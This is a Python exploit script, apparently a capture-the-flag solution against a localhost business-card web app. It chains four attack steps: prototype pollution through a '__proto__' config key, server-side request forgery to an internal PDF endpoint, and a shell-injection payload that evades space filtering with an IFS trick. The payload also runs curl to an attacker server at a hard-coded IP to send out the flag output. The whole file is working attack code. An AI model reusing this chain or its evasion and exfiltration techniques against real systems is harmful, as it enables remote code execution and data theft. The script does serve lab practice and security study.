import requests
import urllib.parse

target_baseurl = "http://localhost:52043"
pwn_server_url = "http://172.22.209.203:1111"


def step1_create_dummy_card():
    # create card
    requests.post(
        f"{target_baseurl}/create-card",
        headers={"content-type": "application/x-www-form-urlencoded"},
        data={
            "firstName": "pwn",
            "lastName": "pwn",
            "company": "pwn",
            "email": "pwn@pwn.pwn",
            "github": "athack-ctf"
        }
    )
    # the above should create a card with this id "d562f97d9a7bc2f99653cbe15c9784dd"


def step2_construct_loaded_url():
    cardid = "d562f97d9a7bc2f99653cbe15c9784dd"

    # Payload
    s_env = 'S="${IFS%"${IFS#?}"}"'
    payload = f"curl {pwn_server_url}?flag=$(echo-flag)"
    spaceless_payload = "';" + s_env + ";" + payload.replace(" ", "${S}") + ';#'

    print(spaceless_payload)
    pwn_data = urllib.parse.quote(f"{spaceless_payload} {cardid}")
    return f"http://localhost:1984/make-card-pdf?data={pwn_data}"


def step3_pollute_avatar_url_for_ssrf(loaded_url):
    requests.post(
        f"{target_baseurl}/set-config",
        headers={"content-type": "application/x-www-form-urlencoded"},
        data={
            'config': '__proto__',
            'key': 'avatarUrl',
            'val': loaded_url
        }
    )


def step4_trigger_ssrf_and_pwn():
    # create card (another one)
    requests.post(
        f"{target_baseurl}/create-card",
        headers={"content-type": "application/x-www-form-urlencoded"},
        data={
            "firstName": "pwner",
            "lastName": "pwner",
            "company": "pwner",
            "email": "pwner@pwn.pwn",
            "github": "athack-ctf"
        }
    )
    # the above should create a card with id df875d04f422b73059f74173213404ef
    loaded_cardid = "df875d04f422b73059f74173213404ef"
    requests.get(f"{target_baseurl}/download-card?cardId={loaded_cardid}&email=pwner@pwn.pwn")


if __name__ == '__main__':
    step1_create_dummy_card()

    loaded_url = step2_construct_loaded_url()

    step3_pollute_avatar_url_for_ssrf(loaded_url)

    step4_trigger_ssrf_and_pwn()
